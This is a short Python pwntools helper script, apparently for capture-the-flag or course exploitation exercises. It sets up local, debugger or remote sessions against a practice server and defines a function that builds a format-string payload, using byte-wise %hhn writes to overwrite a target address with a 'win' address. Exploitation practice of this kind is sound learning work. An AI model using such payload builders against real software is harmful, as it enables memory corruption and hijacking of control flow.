#!/usr/bin/env python3

from pwn import *

global p
global elf

def start(prog, args, port=None, gdb_cmd=None):
    prog = './' + prog

    context.arch = 'i386'
    context.terminal = ['urxvtc', '-e', 'sh', '-c']

    if args.REMOTE:
        p = remote('plsdonthaq.me', port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog, gdb_cmd) 
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p, elf

def grab(p, start, end):
    p.recvuntil(start)
    return p.recvuntil(end, drop=True)

def pack(msg):
    print(bytes(msg, 'utf-8'))
    return bytes(msg, 'utf-8')

def fmtstr_build(win, target, offset, padding):
    payload = b"A" * padding
    payload += p32(target + 0) + p32(target + 1) + p32(target + 2) + p32(target + 3)
    payload += f"%{240 - padding}c".encode()

    for i in range(4):
        byte = win & 0xff
        win >>= 8
        if (byte == 0):
            payload += f"%{offset + i}$hhn".encode()
        else:
            payload += f"%{byte}c%{offset + i}$hhn%{256 - byte}c".encode()

    return payload
